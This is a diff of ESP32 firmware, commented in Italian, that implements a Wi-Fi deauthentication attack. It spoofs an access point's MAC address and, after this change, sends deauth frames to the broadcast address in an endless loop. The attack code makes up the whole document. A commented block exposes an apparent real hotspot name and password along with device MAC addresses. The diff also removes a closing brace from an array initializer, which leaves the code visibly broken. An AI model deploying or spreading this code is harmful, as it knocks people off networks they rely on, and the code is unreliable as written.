@@ -14,9 +14,9 @@ extern "C" {
 #include "packet.hpp"
 #include <cstring>
 
-PacketSender sender;
 #define TASK_NAME "spam_task"
 
+PacketSender sender;
 wifi_ap_record_t *apRecords;
 void deauth_task(MacAddr bssid, uint8_t prim_chan);
 
@@ -155,8 +155,10 @@ void spoofMAC(MacAddr* pMAC ){
 //esp_err_t esp_wifi_scan_stop(void)
 //esp_err_t esp_wifi_scan_get_ap_records(uint16_t *number, wifi_ap_record_t *ap_records)
 void scanWifi(void *pvParameter){
+    
     ESP_LOGI(TASK_NAME, "entrato nella funzione SCANWIFI");
     while(1){
+        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
         vTaskDelay(1000 / portTICK_PERIOD_MS);
         //ESP_LOGI(TASK_NAME, "prima di scan_start");
 
@@ -204,41 +206,48 @@ void deauth_task(MacAddr bssid, uint8_t prim_chan) {
 
     
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
- 
+    
 
-        //.ap = {
-          //  .ssid = "Xiaomi 11T Pro",
-           // .ssid_len = 14,
-           // .password = "C@garella18",
-           // .channel = prim_chan,
-           // .authmode = WIFI_AUTH_WPA2_PSK,
-           /// .ssid_hidden = 0,
-           // .max_connection = 4,
-           // .beacon_interval = 60000
+    //.ap = {
+        //  .ssid = "Xiaomi 11T Pro",
+        // .ssid_len = 14,
+        // .password = "C@garella18",
+        // .channel = prim_chan,
+        // .authmode = WIFI_AUTH_WPA2_PSK,
+        /// .ssid_hidden = 0,
+        // .max_connection = 4,
+        // .beacon_interval = 60000
 
-    const MacAddr TARGET = { //target broadcast
+    const MacAddr TARGET = { 
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
+    };
+
+    const MacAddr TARGETprova = { 
+        0x08, 0x98, 0x0c, 0x70, 0x86, 0x95
     };
     MacAddr AP = {
         //re place with your AP's mac address
         //98:ca:33
         0x98, 0xca, 0x33, 0x32, 0x65, 0xe4
-    };
+
+
+    
+    //08 b6 1f 3b 3c 54
     spoofMAC(&AP);
     ESP_LOGI(TASK_NAME, "dopo spoof MAC");
     //ESP_ERROR_CHECK(esp_wifi_set_mac(,AP));
-    //scanWifi();
     
 
     esp_err_t res;
 
-    res = sender.deauth(TARGET, AP, bssid, 1, prim_chan);
-    ESP_LOGI(TASK_NAME, "dopo sender.deauth");
-
-    if(res != ESP_OK) {
-        printf("  Error: %s\n", esp_err_to_name(res));
+    while(1){
+        res = sender.deauth(TARGET, AP, bssid, 1, prim_chan);
+        ESP_LOGI(TASK_NAME, "dopo sender.deauth");
+        
+        ESP_LOGI(TASK_NAME," RES:  %s\n", esp_err_to_name(res));
+        
+        vTaskDelay(5000 / portTICK_PERIOD_MS);
     }
-    vTaskDelay(10000 / portTICK_PERIOD_MS);
 }
 
 
